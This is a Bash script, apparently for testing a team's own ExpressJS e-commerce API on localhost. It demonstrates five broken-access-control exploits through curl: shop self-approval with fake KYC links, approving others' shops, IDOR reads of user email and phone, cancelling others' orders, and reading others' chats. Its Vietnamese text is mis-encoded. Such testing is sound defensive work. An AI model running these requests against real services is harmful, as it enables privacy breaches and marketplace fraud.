#!/bin/bash

###############################################################################
# SCRIPT DEMO KHAI TH√ÅC C√ÅC L·ªñ H·ªîNG PH√ÇN QUY·ªÄN
# Ecommerce ExpressJS Project
#
# S·ª≠ d·ª•ng: ./test-authorization-exploits.sh
# Y√™u c·∫ßu: jq (sudo apt-get install jq)
###############################################################################

set -e

# Configuration
API_BASE_URL="${API_BASE_URL:-http://localhost:3000}"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Helper functions
print_header() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}\n"
}

print_success() {
    echo -e "${GREEN}‚úÖ $1${NC}"
}

print_error() {
    echo -e "${RED}‚ùå $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}‚ö†Ô∏è  $1${NC}"
}

print_info() {
    echo -e "${BLUE}‚ÑπÔ∏è  $1${NC}"
}

# Test if server is running
check_server() {
    print_info "Ki·ªÉm tra server t·∫°i $API_BASE_URL..."
    if curl -s -o /dev/null -w "%{http_code}" "$API_BASE_URL/api/health" | grep -q "200"; then
        print_success "Server ƒëang ch·∫°y"
    else
        print_error "Server kh√¥ng ph·∫£n h·ªìi. Vui l√≤ng kh·ªüi ƒë·ªông server tr∆∞·ªõc."
        exit 1
    fi
}

# Login helper
login() {
    local email=$1
    local password=$2

    response=$(curl -s -X POST "$API_BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$email\",\"password\":\"$password\"}")

    token=$(echo "$response" | jq -r '.data.accessToken // empty')

    if [ -z "$token" ]; then
        print_error "ƒêƒÉng nh·∫≠p th·∫•t b·∫°i cho $email"
        echo "$response" | jq '.'
        return 1
    fi

    echo "$token"
}

###############################################################################
# EXPLOIT #1: SHOP SELF-APPROVAL (CRITICAL)
###############################################################################
exploit_shop_self_approval() {
    print_header "EXPLOIT #1: T·ª∞ DUY·ªÜT SHOP C·ª¶A M√åNH"

    print_info "T·∫°o t√†i kho·∫£n attacker m·ªõi..."
    ATTACKER_EMAIL="attacker-$(date +%s)@example.com"

    # Register
    register_response=$(curl -s -X POST "$API_BASE_URL/api/auth/register" \
        -H "Content-Type: application/json" \
        -d "{
            \"email\":\"$ATTACKER_EMAIL\",
            \"password\":\"Hacker123!\",
            \"fullName\":\"Attacker User\"
        }")

    if echo "$register_response" | jq -e '.success' > /dev/null; then
        print_success "ƒêƒÉng k√Ω th√†nh c√¥ng"
    else
        print_error "ƒêƒÉng k√Ω th·∫•t b·∫°i"
        echo "$register_response" | jq '.'
        return 1
    fi

    # Login
    print_info "ƒêƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n attacker..."
    ATTACKER_TOKEN=$(login "$ATTACKER_EMAIL" "Hacker123!")

    if [ -z "$ATTACKER_TOKEN" ]; then
        print_error "Kh√¥ng th·ªÉ l·∫•y token"
        return 1
    fi

    print_success "ƒêƒÉng nh·∫≠p th√†nh c√¥ng"

    # Activate account (gi·∫£ s·ª≠ c√≥ endpoint n√†y)
    print_info "K√≠ch ho·∫°t t√†i kho·∫£n..."
    curl -s -X PUT "$API_BASE_URL/api/users/activate" \
        -H "Authorization: Bearer $ATTACKER_TOKEN" \
        -H "Content-Type: application/json" > /dev/null

    # Create shop
    print_info "T·∫°o shop m·ªõi..."
    shop_response=$(curl -s -X POST "$API_BASE_URL/api/shops" \
        -H "Authorization: Bearer $ATTACKER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{
            \"name\":\"Fake Shop $(date +%s)\",
            \"description\":\"This is a malicious shop\"
        }")

    SHOP_ID=$(echo "$shop_response" | jq -r '.data.id // empty')

    if [ -z "$SHOP_ID" ]; then
        print_error "T·∫°o shop th·∫•t b·∫°i"
        echo "$shop_response" | jq '.'
        return 1
    fi

    print_success "T·∫°o shop th√†nh c√¥ng: $SHOP_ID"

    # Submit KYC
    print_info "Submit KYC gi·∫£ m·∫°o..."
    curl -s -X POST "$API_BASE_URL/api/shops/$SHOP_ID/kyc" \
        -H "Authorization: Bearer $ATTACKER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{
            \"businessLicense\":\"https://fake-url.com/license.pdf\",
            \"identityCard\":\"https://fake-url.com/id.jpg\"
        }" > /dev/null

    # Submit for approval
    print_info "Submit shop ƒë·ªÉ ƒë∆∞·ª£c duy·ªát..."
    curl -s -X PUT "$API_BASE_URL/api/shops/$SHOP_ID/submit-approval" \
        -H "Authorization: Bearer $ATTACKER_TOKEN" > /dev/null

    # üö® THE EXPLOIT: Self-approve
    print_warning "üö® KHAI TH√ÅC: T·ª± duy·ªát shop c·ªßa m√¨nh..."
    approval_response=$(curl -s -X PUT "$API_BASE_URL/api/shops/$SHOP_ID/approval" \
        -H "Authorization: Bearer $ATTACKER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"note\":\"I approve myself!\"}")

    http_code=$(echo "$approval_response" | jq -r '.statusCode // 200')

    if [ "$http_code" -eq 200 ]; then
        print_error "L·ªñ H·ªîNG X√ÅC NH·∫¨N! Shop ƒë√£ ƒë∆∞·ª£c t·ª± duy·ªát"
        print_warning "Shop ID: $SHOP_ID"
        print_warning "Tr·∫°ng th√°i: $(echo "$approval_response" | jq -r '.data.status')"
        echo -e "\n${RED}ƒê√¢y l√† l·ªó h·ªïng CRITICAL! B·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ t·ª± duy·ªát shop.${NC}"
        return 0
    elif [ "$http_code" -eq 403 ]; then
        print_success "B·∫¢O M·∫¨T OK: Y√™u c·∫ßu b·ªã t·ª´ ch·ªëi (403 Forbidden)"
        echo "$approval_response" | jq '.'
        return 0
    else
        print_warning "K·∫øt qu·∫£ kh√¥ng x√°c ƒë·ªãnh: HTTP $http_code"
        echo "$approval_response" | jq '.'
        return 0
    fi
}

###############################################################################
# EXPLOIT #2: APPROVE OTHER'S SHOP
###############################################################################
exploit_approve_others_shop() {
    print_header "EXPLOIT #2: DUY·ªÜT SHOP C·ª¶A NG∆Ø·ªúI KH√ÅC"

    print_info "Scenario: Customer th∆∞·ªùng th·ª≠ duy·ªát shop c·ªßa seller"

    # C·∫ßn c√≥ 2 t√†i kho·∫£n: 1 seller (victim), 1 customer (attacker)
    print_info "ƒêƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n customer..."

    # Gi·∫£ s·ª≠ ƒë√£ c√≥ s·∫µn t√†i kho·∫£n customer
    read -p "Nh·∫≠p email c·ªßa customer (attacker): " CUSTOMER_EMAIL
    read -sp "Nh·∫≠p password: " CUSTOMER_PASSWORD
    echo ""

    CUSTOMER_TOKEN=$(login "$CUSTOMER_EMAIL" "$CUSTOMER_PASSWORD")

    if [ -z "$CUSTOMER_TOKEN" ]; then
        print_error "ƒêƒÉng nh·∫≠p th·∫•t b·∫°i"
        return 1
    fi

    read -p "Nh·∫≠p Shop ID c·ªßa victim (ƒë·ªÉ th·ª≠ duy·ªát): " VICTIM_SHOP_ID

    print_warning "üö® KHAI TH√ÅC: Customer th·ª≠ duy·ªát shop c·ªßa ng∆∞·ªùi kh√°c..."
    approval_response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -X PUT "$API_BASE_URL/api/shops/$VICTIM_SHOP_ID/approval" \
        -H "Authorization: Bearer $CUSTOMER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"note\":\"Unauthorized approval by customer\"}")

    http_code=$(echo "$approval_response" | grep "HTTP_CODE:" | cut -d':' -f2)
    body=$(echo "$approval_response" | sed '/HTTP_CODE:/d')

    if [ "$http_code" -eq 200 ]; then
        print_error "L·ªñ H·ªîNG X√ÅC NH·∫¨N! Customer c√≥ th·ªÉ duy·ªát shop c·ªßa ng∆∞·ªùi kh√°c"
        echo "$body" | jq '.'
        echo -e "\n${RED}T√°c ƒë·ªông: Ph√° ho·∫°i quy tr√¨nh KYC, duy·ªát shop l·ª´a ƒë·∫£o${NC}"
    elif [ "$http_code" -eq 403 ]; then
        print_success "B·∫¢O M·∫¨T OK: Y√™u c·∫ßu b·ªã t·ª´ ch·ªëi"
        echo "$body" | jq '.'
    else
        print_warning "HTTP Code: $http_code"
        echo "$body" | jq '.'
    fi
}

###############################################################################
# EXPLOIT #3: IDOR - VIEW OTHER USER'S INFO
###############################################################################
exploit_idor_user_info() {
    print_header "EXPLOIT #3: XEM TH√îNG TIN USER KH√ÅC (IDOR)"

    print_info "ƒêƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n attacker..."
    read -p "Nh·∫≠p email attacker: " ATTACKER_EMAIL
    read -sp "Nh·∫≠p password: " ATTACKER_PASSWORD
    echo ""

    ATTACKER_TOKEN=$(login "$ATTACKER_EMAIL" "$ATTACKER_PASSWORD")

    if [ -z "$ATTACKER_TOKEN" ]; then
        return 1
    fi

    print_info "L·∫•y th√¥ng tin c·ªßa ch√≠nh m√¨nh (ƒë·ªÉ bi·∫øt format response)..."
    my_info=$(curl -s -X GET "$API_BASE_URL/api/auth/me" \
        -H "Authorization: Bearer $ATTACKER_TOKEN")

    MY_USER_ID=$(echo "$my_info" | jq -r '.data.id')
    print_success "User ID c·ªßa attacker: $MY_USER_ID"

    read -p "Nh·∫≠p User ID c·ªßa victim (ƒë·ªÉ xem th√¥ng tin): " VICTIM_USER_ID

    print_warning "üö® KHAI TH√ÅC: Xem th√¥ng tin c·ªßa user kh√°c..."
    victim_info=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -X GET "$API_BASE_URL/api/users/$VICTIM_USER_ID" \
        -H "Authorization: Bearer $ATTACKER_TOKEN")

    http_code=$(echo "$victim_info" | grep "HTTP_CODE:" | cut -d':' -f2)
    body=$(echo "$victim_info" | sed '/HTTP_CODE:/d')

    if [ "$http_code" -eq 200 ]; then
        print_error "L·ªñ H·ªîNG IDOR X√ÅC NH·∫¨N! C√≥ th·ªÉ xem th√¥ng tin user kh√°c"
        echo -e "\n${YELLOW}Th√¥ng tin r√≤ r·ªâ:${NC}"
        echo "$body" | jq '{
            id: .data.id,
            email: .data.email,
            phone: .data.phone,
            status: .data.status,
            emailVerified: .data.emailVerified
        }'
        echo -e "\n${RED}T√°c ƒë·ªông: R√≤ r·ªâ email, phone, status ‚Üí Phishing attacks${NC}"
    elif [ "$http_code" -eq 403 ]; then
        print_success "B·∫¢O M·∫¨T OK: Kh√¥ng th·ªÉ xem th√¥ng tin user kh√°c"
        echo "$body" | jq '.'
    else
        print_warning "HTTP Code: $http_code"
        echo "$body" | jq '.'
    fi
}

###############################################################################
# EXPLOIT #4: UNAUTHORIZED ORDER STATUS UPDATE
###############################################################################
exploit_order_status_update() {
    print_header "EXPLOIT #4: THAY ƒê·ªîI TR·∫†NG TH√ÅI ƒê∆°N H√ÄNG C·ª¶A NG∆Ø·ªúI KH√ÅC"

    print_info "ƒêƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n attacker..."
    read -p "Nh·∫≠p email attacker: " ATTACKER_EMAIL
    read -sp "Nh·∫≠p password: " ATTACKER_PASSWORD
    echo ""

    ATTACKER_TOKEN=$(login "$ATTACKER_EMAIL" "$ATTACKER_PASSWORD")

    if [ -z "$ATTACKER_TOKEN" ]; then
        return 1
    fi

    read -p "Nh·∫≠p Order ID c·ªßa victim: " VICTIM_ORDER_ID

    print_warning "üö® KHAI TH√ÅC: Th·ª≠ h·ªßy ƒë∆°n h√†ng c·ªßa ng∆∞·ªùi kh√°c..."
    update_response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -X PUT "$API_BASE_URL/api/orders/$VICTIM_ORDER_ID/status" \
        -H "Authorization: Bearer $ATTACKER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"status\":\"CANCELLED\"}")

    http_code=$(echo "$update_response" | grep "HTTP_CODE:" | cut -d':' -f2)
    body=$(echo "$update_response" | sed '/HTTP_CODE:/d')

    if [ "$http_code" -eq 200 ]; then
        print_error "L·ªñ H·ªîNG X√ÅC NH·∫¨N! C√≥ th·ªÉ thay ƒë·ªïi tr·∫°ng th√°i ƒë∆°n h√†ng c·ªßa ng∆∞·ªùi kh√°c"
        echo "$body" | jq '.'
        echo -e "\n${RED}T√°c ƒë·ªông: H·ªßy ƒë∆°n c·ªßa ng∆∞·ªùi kh√°c, DoS attack${NC}"
    elif [ "$http_code" -eq 403 ] || [ "$http_code" -eq 404 ]; then
        print_success "B·∫¢O M·∫¨T OK: Kh√¥ng th·ªÉ s·ª≠a ƒë∆°n h√†ng c·ªßa ng∆∞·ªùi kh√°c"
        echo "$body" | jq '.'
    else
        print_warning "HTTP Code: $http_code"
        echo "$body" | jq '.'
    fi
}

###############################################################################
# EXPLOIT #5: CHAT CONVERSATION ACCESS
###############################################################################
exploit_chat_conversation() {
    print_header "EXPLOIT #5: ƒê·ªåC TIN NH·∫ÆN CHAT C·ª¶A NG∆Ø·ªúI KH√ÅC"

    print_info "ƒêƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n attacker..."
    read -p "Nh·∫≠p email attacker: " ATTACKER_EMAIL
    read -sp "Nh·∫≠p password: " ATTACKER_PASSWORD
    echo ""

    ATTACKER_TOKEN=$(login "$ATTACKER_EMAIL" "$ATTACKER_PASSWORD")

    if [ -z "$ATTACKER_TOKEN" ]; then
        return 1
    fi

    read -p "Nh·∫≠p Conversation ID c·ªßa ng∆∞·ªùi kh√°c: " VICTIM_CONV_ID

    print_warning "üö® KHAI TH√ÅC: ƒê·ªçc messages trong conversation c·ªßa ng∆∞·ªùi kh√°c..."
    messages_response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -X GET "$API_BASE_URL/api/chat/conversations/$VICTIM_CONV_ID/messages" \
        -H "Authorization: Bearer $ATTACKER_TOKEN")

    http_code=$(echo "$messages_response" | grep "HTTP_CODE:" | cut -d':' -f2)
    body=$(echo "$messages_response" | sed '/HTTP_CODE:/d')

    if [ "$http_code" -eq 200 ]; then
        print_error "L·ªñ H·ªîNG X√ÅC NH·∫¨N! C√≥ th·ªÉ ƒë·ªçc tin nh·∫Øn c·ªßa ng∆∞·ªùi kh√°c"
        echo -e "\n${YELLOW}Messages r√≤ r·ªâ:${NC}"
        echo "$body" | jq '.data[0:3]'  # Show first 3 messages
        echo -e "\n${RED}T√°c ƒë·ªông: Privacy breach, ƒë·ªçc th√¥ng tin nh·∫°y c·∫£m (ƒë·ªãa ch·ªâ, gi√° c·∫£, etc.)${NC}"
    elif [ "$http_code" -eq 403 ] || [ "$http_code" -eq 404 ]; then
        print_success "B·∫¢O M·∫¨T OK: Kh√¥ng th·ªÉ ƒë·ªçc conversation c·ªßa ng∆∞·ªùi kh√°c"
        echo "$body" | jq '.'
    else
        print_warning "HTTP Code: $http_code"
        echo "$body" | jq '.'
    fi
}

###############################################################################
# MAIN MENU
###############################################################################
show_menu() {
    echo -e "\n${BLUE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
    echo -e "${BLUE}‚ïë     DEMO KHAI TH√ÅC L·ªñ H·ªîNG PH√ÇN QUY·ªÄN - ECOMMERCE         ‚ïë${NC}"
    echo -e "${BLUE}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}\n"
    echo "1. Exploit #1: T·ª± duy·ªát shop c·ªßa m√¨nh (Shop Self-Approval)"
    echo "2. Exploit #2: Duy·ªát shop c·ªßa ng∆∞·ªùi kh√°c"
    echo "3. Exploit #3: Xem th√¥ng tin user kh√°c (IDOR)"
    echo "4. Exploit #4: Thay ƒë·ªïi tr·∫°ng th√°i ƒë∆°n h√†ng c·ªßa ng∆∞·ªùi kh√°c"
    echo "5. Exploit #5: ƒê·ªçc tin nh·∫Øn chat c·ªßa ng∆∞·ªùi kh√°c"
    echo "6. Ch·∫°y t·∫•t c·∫£ exploits (t·ª± ƒë·ªông)"
    echo "0. Tho√°t"
    echo ""
}

main() {
    # Check jq installation
    if ! command -v jq &> /dev/null; then
        print_error "jq ch∆∞a ƒë∆∞·ª£c c√†i ƒë·∫∑t. Vui l√≤ng ch·∫°y: sudo apt-get install jq"
        exit 1
    fi

    # Check server
    check_server

    while true; do
        show_menu
        read -p "Ch·ªçn exploit (0-6): " choice

        case $choice in
            1) exploit_shop_self_approval ;;
            2) exploit_approve_others_shop ;;
            3) exploit_idor_user_info ;;
            4) exploit_order_status_update ;;
            5) exploit_chat_conversation ;;
            6)
                exploit_shop_self_approval
                sleep 2
                exploit_approve_others_shop
                sleep 2
                exploit_idor_user_info
                sleep 2
                exploit_order_status_update
                sleep 2
                exploit_chat_conversation
                ;;
            0)
                print_info "Tho√°t ch∆∞∆°ng tr√¨nh."
                exit 0
                ;;
            *)
                print_error "L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá"
                ;;
        esac

        echo ""
        read -p "Nh·∫•n Enter ƒë·ªÉ ti·∫øp t·ª•c..."
    done
}

# Run main
main
